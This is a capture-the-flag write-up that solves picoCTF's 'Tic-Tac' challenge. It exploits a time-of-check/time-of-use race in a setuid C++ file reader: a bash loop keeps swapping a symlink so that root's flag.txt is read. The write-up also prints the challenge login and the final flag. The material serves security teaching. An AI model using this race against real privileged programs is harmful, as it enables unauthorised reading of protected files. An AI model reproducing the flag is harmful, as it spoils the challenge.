
# Tic-Tac

*Hard*

>### Description
>Someone created a program to read text files; we think the program reads files with root privileges but apparently it only accepts to read files that are owned by the user running it.
ssh to saturn.picoctf.net:64035, and run the binary named "txtreader" once connected. Login as ctf-player with the password, d8819d45

### Solution

In the home directory of ctf-player I find three files: 
```
-rw------- 1 root       root          32 Aug  4  2023 flag.txt
-rw-r--r-- 1 ctf-player ctf-player   912 Mar 16  2023 src.cpp
-rwsr-xr-x 1 root       root       19016 Aug  4  2023 txtreader
```

- Notice that the executable has the "setuid" bit set.

Lets look at the `src.cpp` file:

```c
#include <iostream>
#include <fstream>
#include <unistd.h>
#include <sys/stat.h>

int main(int argc, char *argv[]) {
  if (argc != 2) {
    std::cerr << "Usage: " << argv[0] << " <filename>" << std::endl;
    return 1;
  }

  std::string filename = argv[1];
  std::ifstream file(filename);
  struct stat statbuf;

  // Check the file's status information.
  if (stat(filename.c_str(), &statbuf) == -1) {
    std::cerr << "Error: Could not retrieve file information" << std::endl;
    return 1;
  }

  // Check the file's owner.
  if (statbuf.st_uid != getuid()) {
    std::cerr << "Error: you don't own this file" << std::endl;
    return 1;
  }

  // Read the contents of the file.
  if (file.is_open()) {
    std::string line;
    while (getline(file, line)) {
      std::cout << line << std::endl;
    }
  } else {
    std::cerr << "Error: Could not open file" << std::endl;
    return 1;
  }

  return 0;
}
```

>I did not really know how to exploit this... So I asked ChatGPT, it came up with a symlink attack using race conditions. A TOCTOU (Time-of-check Time-of-use) Attack, then I read the tag of the challenge that also said TOCTOU, and yeah, I should have seen that earlier...

The idea is that there is a time between the permissions check and the file reader. So we can create a symlink that is constantly switched between the `flag.txt` and some file I own. So create such a file with `echo "hi" > my.txt`, and then create a script.sh file that continuously switches the link:

```bash
#!/bin/bash
while true; do
    ln -sf my.txt symlink
    ln -sf /home/ctf-player/flag.txt symlink
done
```

Run this script in the background with `./script.sh &`. Now that the "symlink" is continuously switched between the flag and our owned file. Just spam `./txtreader symlink` until it prints the flag, it takes some ~~timing~~ luck to get it right.

<details>
<summary>Yes! We got the flag:</summary> 
picoCTF{ToctoU_!s_3a5y_5748402c}
</details>